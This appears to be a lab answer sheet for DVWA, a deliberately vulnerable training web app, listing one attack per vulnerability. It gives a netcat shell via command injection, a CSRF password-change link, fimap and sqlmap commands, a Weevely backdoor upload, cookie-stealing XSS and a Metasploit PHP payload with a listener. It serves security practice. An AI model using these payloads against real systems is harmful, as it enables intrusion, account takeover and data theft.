# DVWA-Answers

### Command Execution:
10.0.0.1 & nc -l 4444
then connect with your machine: nc <ip> <port>

### CSRF you can send this link to an admin user or xss it:
http://10.195.2.2/dvwa/vulnerabilities/csrf/?password_new=asd123&password_conf=asd123&Change=Change#

### File Inclusion:
fimap -u 'http://10.195.2.2/dvwa/vulnerabilities/fi/?page=include.php' --cookie='security=medium; PHPSESSID=43e836347ea74c7e3bc51f9a321bee24' -x

### SQLi + SQLi Blind:
Put a number in the user ID and capture it with burp, save the capture to a file then run this it shows the method used to extract info.
sqlmap -r /root/Desktop/dvwa -a
or
sqlmap -u 'http://10.195.2.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='security=medium; PHPSESSID=43e836347ea74c7e3bc51f9a321bee24' -a

### Unrestricted File Upload:
Use Weevely to create a backdoor and rename it back.php.jpg then upload it and connect to it with Weevely.  If it doesn't tell you where it uploads use Burpsuite to spider the site.

### XSS reflected (low):
<script>alert("TesT")</script>
<script>alert(document.cookie)</script>

### XSS stored (low):
<script>alert("TesT")</script>
<script>alert(document.cookie)</script>
http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson9/
You can upload a metasploit php payload and put it in <script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script> and set up a listener




